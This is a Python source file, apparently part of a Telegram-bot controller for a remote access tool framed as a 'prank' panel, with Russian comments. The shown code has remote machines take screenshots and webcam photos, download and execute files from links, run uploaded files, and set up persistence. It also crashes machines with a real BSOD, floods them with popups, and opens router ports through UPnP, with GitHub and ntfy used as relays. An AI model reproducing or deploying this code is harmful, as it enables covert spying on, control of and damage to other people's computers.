            except Exception:
                pass
            finally:
                beat.cancel()
        except Exception:
            pass
        await asyncio.sleep(3.0)

async def restore_cat(cb, ctx: ContextTypes.DEFAULT_TYPE, chat_id: int):
    cat = PRANK_HOME.get(cb.data)
    if not cat:
        await send_menu(chat_id, ctx)
        return
    title, mk_fn = CAT_KBS[cat]
    try:
        await cb.message.edit_text(f"{title}\nпредыдущий улетел — тапай следующий", reply_markup=mk_fn())
    except Exception:
        pass   # меню уже на экране — клавиатура жива, трогать нечего

async def run_thread_prank(cb, ctx: ContextTypes.DEFAULT_TYPE, chat_id: int, jid: str):
    fn = THREAD_PRANKS[jid]
    title = VR_TITLES.get(cb.data, cb.data)
    if prank_busy(title):
        await ctx.bot.send_message(chat_id, f"уже крутится ({title}), не повторяй")
        await restore_cat(cb, ctx, chat_id)
        return
    await cb.message.edit_text(f"🚀 <b>{title}</b> — запускаю", parse_mode="HTML")
    loop = asyncio.get_running_loop()
    pool = RESCUE_POOL if jid in ("vr_off", "vr_panic") else POOL
    try:
        result = await loop.run_in_executor(pool, fn)
        await ctx.bot.send_message(chat_id, result)
    except Exception as e:
        await ctx.bot.send_message(chat_id, f"❌ шутка сорвалась: {e}")
    finally:
        pranks_running.pop(title, None)
    await restore_cat(cb, ctx, chat_id)

# ---------- качалка (через socks5) — живёт на ВЫБРАННОМ хосте, см. _download_on_host ----------

# ---------- текст/фото ----------
async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return
    uid = update.effective_user.id
    text = (update.message.text or "").strip()
    chat_id = update.effective_chat.id

    if isinstance(pending.get(uid), dict) and pending[uid]["mode"] == "upload":
        await update.message.reply_text("жду документ 📤, не текст — в меню: 📤 Загрузить файл")
        return
    if isinstance(pending.get(uid), dict) and pending[uid]["mode"] == "wallpaper":
        await update.message.reply_text("жду картинку 🌆, не текст — в меню: 🌆 Обои с фото")
        return
    job = pending.pop(uid, None)
    if not job or not isinstance(job, dict):
        await send_menu(chat_id, ctx)
        return
    host, mode = job["host"], job["mode"]
    if not text:
        await update.message.reply_text("пусто — набери заново")
        return
    if mode == "download":
        if not text.lower().startswith(("http://", "https://")):
            pending[uid] = job
            await update.message.reply_text("❌ это не ссылка — нужно http…/https…")
            return
        if "." not in urlparse(text).path:
            pending[uid] = job
            await update.message.reply_text("❌ в ссылке нет имени файла — качать нечего")
            return
        await update.message.reply_text(f"⏳ качаю на «{host}» через socks5…")
        res = await host_call(host, {"cmd": "dl", "url": text}, timeout=1200)
        await update.message.reply_text(res.get("text") or "пусто", parse_mode="HTML")
        await send_menu(chat_id, ctx)
        return
    if mode == "runfile":
        res = await host_call(host, {"cmd": "runfile", "path": text}, timeout=60)
        await update.message.reply_text(res.get("text") or "пусто", parse_mode="HTML")
        await send_menu(chat_id, ctx)
    else:
        await update.message.reply_text("непонятный режим — тапни кнопку в меню")
        await send_menu(chat_id, ctx)

async def forward_file_to_host(update, ctx, mime_is_image: bool):
    uid = update.effective_user.id
    job = pending.get(uid)
    if not (isinstance(job, dict) and job["mode"] in ("upload", "wallpaper")):
        await update.message.reply_text(
            "файл пока некуда класть — выбери в меню 📤 Загрузить файл или 🌆 Обои с фото")
        return
    host = job["host"]
    if job["mode"] == "wallpaper":
        if mime_is_image:
            if update.message.photo:
                payload = update.message.photo[-1]
            elif update.message.document:
                payload = update.message.document
                if not (payload.mime_type or "").startswith("image"):
                    await update.message.reply_text("это не картинка — обои только jpg/png")
                    return
            else:
                return
        else:
            if update.message.document:
                await update.message.reply_text("для обоев нужна КАРТИНКА, не архив")
            return
    else:
        if not update.message.document:
            await update.message.reply_text("❌ жду файл-документ")
            return
        payload = update.message.document
    pending.pop(uid, None)
    await update.message.reply_text(f"⏳ передаю на «{host}»…")
    tg_file = await ctx.bot.get_file(payload.file_id)
    data = await tg_file.download_as_bytearray()
    name = getattr(payload, "file_name", None) or f"file_{uuid.uuid4().hex[:8]}"
    cmd = ("wallwallpaper" if job["mode"] == "wallpaper" else "execfile")
    res = await host_call(host, {"cmd": cmd, "name": name, "b64": base64.b64encode(bytes(data)).decode()},
                          timeout=300)
    await update.message.reply_text(res.get("text") or "пусто", parse_mode="HTML")

async def save_photo_and_wallpaper(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not allowed(update):
        return
    if not (isinstance(pending.get(uid), dict) and pending[uid]["mode"] in ("wallpaper", "upload")):
        await update.message.reply_text("фото пока не командую — обои ставятся из меню: 🌆 Обои с фото")
        return
    await forward_file_to_host(update, ctx, mime_is_image=True)

async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return
    doc = update.message.document
    if not doc:
        await update.message.reply_text("❌ жду файл-документ")
        return
    # документы от relay-ноды (большие ответы): caption {"t":"ref","id":rid,...}
    cap = update.message.caption or ""
    try:
        ref = json.loads(cap)
    except Exception:
        ref = {}
    if isinstance(ref, dict) and ref.get("t") == "ref" and ref.get("secret") == RPC_SECRET:
        rid = ref.get("id")
        fut = _pending_calls.pop(rid, None)
        if fut and not fut.done():
            try:
                f = await ctx.bot.get_file(doc.file_id)
                blob = await f.download_as_bytearray()
                res = json.loads(blob.decode("utf-8", "replace"))
                if isinstance(res, dict) and res.get("id") == rid:
                    fut.set_result({k: v for k, v in res.items() if k != "secret"})
                    return
            except Exception as e:
                with contextlib.suppress(Exception):
                    fut.set_result({"t": "err", "text": f"❌ relay-ответ не скачался: {e}"})
        return
    await forward_file_to_host(update, ctx, mime_is_image=False)

# ---------- колбеки ----------
LOOP_TASKS = {"floodcmd": prank_flood_task, "floodpop": popup_bomb_task,
              "flooddrunk": mouse_drunk_task}

async def cb_tap(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        await update.callback_query.answer("нет доступа", show_alert=True)
        return
    cb = update.callback_query
    chat_id = cb.message.chat.id
    uid = update.effective_user.id
    data = cb.data
    await cb.answer()
    if cb.message:                       # тапнутая клавиатура и есть живая панель
        PANEL[chat_id] = cb.message.message_id
        KNOWN_CHATS.add(chat_id)
    host = SESS.setdefault(chat_id, MASTER_NAME)

    # --- навигация панелью (правится локально) ---
    if data.startswith("hostsel:"):
        name = data.split(":", 1)[1]
        known = {MASTER_NAME} | set(SEEN_HOSTS) | set(HOST_TITLES)
        if name not in known:
            await cb.answer("❌ такого хоста нет", show_alert=False)
            VIEW[chat_id] = "hosts"
            await set_panel(chat_id, ctx, hosts_text(), hosts_kb(chat_id))
            return
        SESS[chat_id] = name          # панель переключается НА ту машину
        VIEW[chat_id] = "main"
        await set_panel(chat_id, ctx, menu_text(chat_id), menu_kb())

    elif data == "whoami":
        VIEW[chat_id] = "hosts"
        await set_panel(chat_id, ctx, hosts_text(), hosts_kb(chat_id))

    elif data == "hostup":
        # 🔄 обновить: перерисовать экран «ХОСТЫ» свежими статусами
        VIEW[chat_id] = "hosts"
        await set_panel(chat_id, ctx, hosts_text(), hosts_kb(chat_id))

    elif data == "main":
        VIEW[chat_id] = "main"
        await set_panel(chat_id, ctx, menu_text(chat_id), menu_kb())

    elif data == "jokes":
        await cb.message.edit_text("😂 <b>ШУТКИ</b>\nподними себе настроение — жми 🎲",
                                   reply_markup=joke_kb(), parse_mode="HTML")

    elif data == "pranks":
        await cb.message.edit_text("😈 <b>ПРИКОЛЫ</b> — арсенал на все вкусы\n"
                                   "экран / периферия / стол / звук / жёсткие / комбо / система",
                                   reply_markup=pranks_kb(), parse_mode="HTML")

    elif data in CAT_KBS:
        title, mk = CAT_KBS[data]
        await cb.message.edit_text(title, reply_markup=mk())

    elif data == "joke":
        emoji, joke = random.choice(JOKES)
        await ctx.bot.send_message(chat_id, f"{emoji} <blockquote>{html.escape(joke)}</blockquote>", parse_mode="HTML")

    # --- команды ВЫБРАННОМУ хосту (себе локально, чужой машине по сети) ---
    elif data == "shot":
        await cb.message.edit_text(f"📸 снимаю экран «{html.escape(host)}»…")
        res = await host_call(host, {"cmd": "shot"}, timeout=90)
        if res.get("t") == "file":
            with contextlib.suppress(Exception):
                await ctx.bot.send_photo(chat_id, io.BytesIO(base64.b64decode(res["b64"])),
                                         filename=res.get("name", "screen.png"),
                                         caption=f"📸 {host}: готово")
        else:
            await ctx.bot.send_message(chat_id, res.get("text") or "пусто", parse_mode="HTML")
        await send_menu(chat_id, ctx)

    elif data == "webcam":
        await cb.message.edit_text(f"🎥 снимаю вебки «{html.escape(host)}»…")
        res = await host_call(host, {"cmd": "webcam"}, timeout=90)
        files = res.get("files") or []
        if res.get("t") == "err":
            await ctx.bot.send_message(chat_id, res["text"], parse_mode="HTML")
        elif not files:
            await ctx.bot.send_message(chat_id, "🎥 камер на этом хосте не нашлось")
        else:
            for f in files:
                with contextlib.suppress(Exception):
                    await ctx.bot.send_photo(chat_id, io.BytesIO(base64.b64decode(f["b64"])),
                                             filename=f.get("name", "webcam.jpg"),
                                             caption=f"🎥 {host}: {f.get('name', 'вебка')}")
            await ctx.bot.send_message(chat_id,
                                       f"🎥 снимок доставлен{'' if len(files) == 1 else f' · камер: {len(files)}'}")
        await send_menu(chat_id, ctx)

    elif data == "status":
        res = await host_call(host, {"cmd": "status"}, timeout=60)
        text = res.get("text") or "пустой ответ"
        await set_panel(chat_id, ctx, text, kb([("⬅️ Меню", "main")]))

    elif data in ("pauto_on", "pauto_off"):
        cmd = "persist_on" if data == "pauto_on" else "persist_off"
        res = await host_call(host, {"cmd": cmd}, timeout=30)
        await ctx.bot.send_message(chat_id,
                                   f"♻️ хост «{html.escape(host)}»: {res.get('text') or 'пусто'}",
                                   parse_mode="HTML")
        await send_menu(chat_id, ctx)

    elif data == "run":
        pending[uid] = {"mode": "runfile", "host": host}
        await cb.message.edit_text(f"🚀 <b>ЗАПУСК ФАЙЛА</b> · хост: <code>{html.escape(host)}</code>\n"
                                    "напиши в чат полный путь, например:\n"
                                    "<code>C:\\Users\\Пк\\файл.bat</code>",
                                    reply_markup=prompt_kb(), parse_mode="HTML")

    elif data == "dl":
        pending[uid] = {"mode": "download", "host": host}
        await cb.message.edit_text(f"📥 <b>СКАЧАТЬ И ЗАПУСТИТЬ</b> · хост: <code>{html.escape(host)}</code>\n"
                                    "напиши в чат прямую ссылку (http/https) — качалка через socks5\n"
                                    "проработает на ВЫБРАННОЙ машине",
                                    reply_markup=prompt_kb(), parse_mode="HTML")

    elif data == "upload":
        pending[uid] = {"mode": "upload", "host": host}
        await cb.message.edit_text(f"📤 <b>ЗАГРУЗКА ФАЙЛА</b> · хост: <code>{html.escape(host)}</code>\n"
                                    "прикрепи файл как <b>документ</b> в этот чат",
                                    reply_markup=prompt_kb(), parse_mode="HTML")

    elif data == "wallpaper":
        pending[uid] = {"mode": "wallpaper", "host": host}
        await cb.message.edit_text(f"🌆 <b>ОБОИ НА СВОЁ ФОТО</b> · хост: <code>{html.escape(host)}</code>\n"
                                    "шли картинку в чат — встанет на рабочий стол ВЫБРАННОЙ машины",
                                    reply_markup=prompt_kb(), parse_mode="HTML")

    # --- зацикленные приколы (со стоп-кнопкой) ---
    elif data in ("floodcmd", "floodpop", "flooddrunk"):
        title = LOOP_TITLES[data]
        await cb.message.edit_text(f"{title} летит, пока не тапнешь ⛔", parse_mode="HTML")
        if host == MASTER_NAME:
            flood_stop.discard(uid)
            asyncio.create_task(LOOP_TASKS[data](uid, chat_id))
        else:
            await host_call(host, {"cmd": "flood", "job": data}, timeout=15)
        await ctx.bot.send_message(chat_id, f"{title} на «{host}» в разгаре…",
                                   reply_markup=kb([("⛔ Стоп", "stopflood")], [("⬅️ Меню", "main")]))

    elif data == "stopflood":
        if host == MASTER_NAME:
            flood_stop.add(uid)
        else:
            await host_call(host, {"cmd": "stopflood"}, timeout=15)
        await cb.message.edit_text(f"🧹 безумие на «{host}» остановлено (странные окна снимите руками)")
        await send_menu(chat_id, ctx)

    elif data == "vr_bsod":
        await cb.message.edit_text(
            "💀 <b>БСОД НАСТОЯЩИЙ</b>\nкраш через 2 секунды — машина уйдёт в перезагрузку,\n"
            "несохранённое сгорит, бот замолчит до конца ребута.\n"
            "после ребута всё чисто (♻️ автозапуск решает, вернётся ли вирусня)",
            parse_mode="HTML")
        if host == MASTER_NAME:
            threading.Thread(target=v_bsod_bg, daemon=True).start()
        else:
            await host_call(host, {"cmd": "crash"}, timeout=15)

    elif data in THREAD_PRANKS:
        if host == MASTER_NAME:
            await run_thread_prank(cb, ctx, chat_id, data)
        else:
            title = VR_TITLES.get(data, data)
            if prank_busy(f"{title}@{host}"):
                await ctx.bot.send_message(chat_id, f"уже крутится ({title} на {host}), не повторяй")
                await restore_cat(cb, ctx, chat_id)
                return
            await cb.message.edit_text(f"🚀 <b>{title}</b> → хост {html.escape(host)}", parse_mode="HTML")
            res = await host_call(host, {"cmd": "prank", "job": data}, timeout=900)
            await ctx.bot.send_message(chat_id, res.get("text") or "пусто", parse_mode="HTML")
            pranks_running.pop(f"{title}@{host}", None)
            await restore_cat(cb, ctx, chat_id)

    elif data == "cancel":
        pending.pop(uid, None)
        await cb.message.edit_text("🧹 сброшено")
        await send_menu(chat_id, ctx)

async def on_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return
    chat_id = update.effective_chat.id
    KNOWN_CHATS.add(chat_id)
    # /start ВСЕГДА открывает меню-панель: хост уже в шапке, смена хоста — внутри
    SESS.setdefault(chat_id, MASTER_NAME)
    try:
        await send_menu(chat_id, ctx)
    except Exception as e:
        logging.exception("меню не открылось: %s", e)
        with contextlib.suppress(Exception):
            await update.message.reply_text(menu_text(chat_id), reply_markup=menu_kb(), parse_mode="HTML")

_TOKEN_STOLEN = False    # True = getUpdates вернул 409: токен несёт другой пульт
_APP_STOPPED_OK = False  # штатный app.stop() прошёл — respawn не нужен

async def _stop_app(app):
    global _APP_STOPPED_OK
    with contextlib.suppress(Exception):
        await app.stop()
        _APP_STOPPED_OK = True

def _leave_as_master():
    """PTB не унимается (state-война во время bootstrap) — перезапускаю себя нодой"""
    if _APP_STOPPED_OK:
        return
    logging.info("апп не остановился штатно — перезапускаюсь нодой")
    try:
        if getattr(sys, "frozen", False):
            subprocess.Popen([sys.executable, "--node"])
        else:
            subprocess.Popen([sys.executable, "-X", "utf8", os.path.abspath(__file__), "--node"])
    except Exception:
        pass
    os._exit(3)

async def _token_busy_probe() -> bool:
    """разовый getUpdates с offset=-1: 409 = владелец уже есть (жить нодой), без дур PTB"""
    r = await _http().get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
                          params={"offset": "-1", "limit": "1", "timeout": "0"})
    return r.status_code == 409

async def on_err(update, ctx):
    err = getattr(ctx, "error", None)
    s = str(err) if err else ""
    if "Conflict" in s or "terminated by other getUpdates request" in s:
        global _TOKEN_STOLEN
        _TOKEN_STOLEN = True
        logging.info("токен несёт другой пульт (409) → выключаюсь и становлюсь нодой")
        loop = asyncio.get_running_loop()
        loop.create_task(_stop_app(ctx.application))
        loop.call_later(2.5, _leave_as_master)   # запас: заткнуть PTB любой ценой
        return
    if err:
        logging.error("глюк на %s: %r", update, err)
    else:
        logging.error("глюк: %r", (update,))

def _acquire_bot_lock():
    """один пульт на машину: вторая копия сразу же закрывается,
    иначе Telegram кидает 409 Conflict и обе копии глючат."""
    try:
        import msvcrt
        DATA_DIR.mkdir(exist_ok=True)
        fh = open(DATA_DIR / "bot.lock", "a+")
        try:
            msvcrt.locking(fh.fileno(), msvcrt.LK_NBLCK, 1)
        except OSError:
            fh.close()
            return None
        try:
            fh.write(str(os.getpid()))
        except Exception:
            pass
        return fh
    except Exception:
        return open(os.devnull, "w")   # некритично: без блокировки всё равно живём

def _master_run() -> None:
    lockfh = _acquire_bot_lock()
    if lockfh is None:
        logging.error("пульт уже запущен в другом окне — эта копия не пускается (bot.lock занят)")
        try:
            print("пульт уже работает. эту копию закрываю; пользуйся работой первого окна.")
        except Exception:
            pass
        time.sleep(2.0)
        return
    from telegram.request import HTTPXRequest
    req = HTTPXRequest(connect_timeout=30, read_timeout=90, write_timeout=300, proxy=PROXY_URL)
    req_updates = HTTPXRequest(connect_timeout=30, read_timeout=90, write_timeout=90, proxy=PROXY_URL)

    async def _post_init(app):
        loop = asyncio.get_running_loop()
        loop.create_task(rpc_server(app))        # TCP-сервер нод (без PTB-варнинга)
        loop.create_task(_disc_server())         # UDP-ответ нодам в той же сети
        loop.create_task(_ntfy_publish_loop())   # резюме адресов для нод из других сетей
        loop.create_task(_upnp_forward_loop())   # прошиваю роутер: порт наружу для чужих стран
        loop.create_task(_relay_master_gh(app))     # github-релей: ноды без открытого порта

    # мастер печатает адрес: в той же сети нода найдёт САМА; из другого интернета — порт наружу
    try:
        print(f"[мастер] слушаю нод на {local_ip()}:{RPC_PORT} (TCP + UDP-поиск)\n"
              f"        вторая машина в той же сети: просто запусти там main.py — найдёт сама\n"
              f"        другой интернет: пробрось порт {RPC_PORT} на этот ПК (или строка NODE_ADDR в её main.py)")
    except Exception:
        pass

    app = (Application.builder()
           .token(BOT_TOKEN)
           .request(req)                   # socks5 — весь трафик через прокси
           .get_updates_request(req_updates)
           .post_init(_post_init)
           .build())
    app.add_handler(CommandHandler(["start", "menu"], on_start))
    app.add_handler(CallbackQueryHandler(cb_tap))
    app.add_handler(MessageHandler(filters.TEXT, on_text))
    app.add_handler(MessageHandler(filters.PHOTO, save_photo_and_wallpaper))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    app.add_error_handler(on_err)
    logging.info("мастер «%s» в работе (прокси: %s, порт нод: %s)",
                 MASTER_NAME, bool(PROXY_URL), RPC_PORT)
    app.run_polling(bootstrap_retries=-1)

def main():
    args = sys.argv[1:]

    # --- явная нода: python main.py --node [IP:ПОРТ] [имя] (без адреса — авто-поиск) ---
    if "--node" in args:
        i = args.index("--node")
        addr = args[i + 1] if len(args) > i + 1 else (NODE_ADDR or None)
        logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s нода %(message)s")
        try:
            asyncio.run(run_node(addr, None))
        except KeyboardInterrupt:
            pass
        return

    # --- быстрый тест токена ещё до бота: владелец уже есть → сразу нода ---
    try:
        token_busy = bool(asyncio.run(_token_busy_probe()))
    except Exception:
        token_busy = False
    if not token_busy:
        try:
            _master_run()
            if not _TOKEN_STOLEN:      # нормальный выход (Ctrl+C/lock) — закрываемся
                return
        except Exception as e:
            s = str(e)
            if "Conflict" not in s and "terminated" not in s:
                raise
    # токен занят — мастер живёт на другой машине: уходим в ноду (мастер ищется сам)
    print("токен занят мастером → работаю нодой (мастер ищется сам: LAN → ntfy)")
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s нода %(message)s")
    try:
        asyncio.run(run_node(NODE_ADDR or None, None))
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
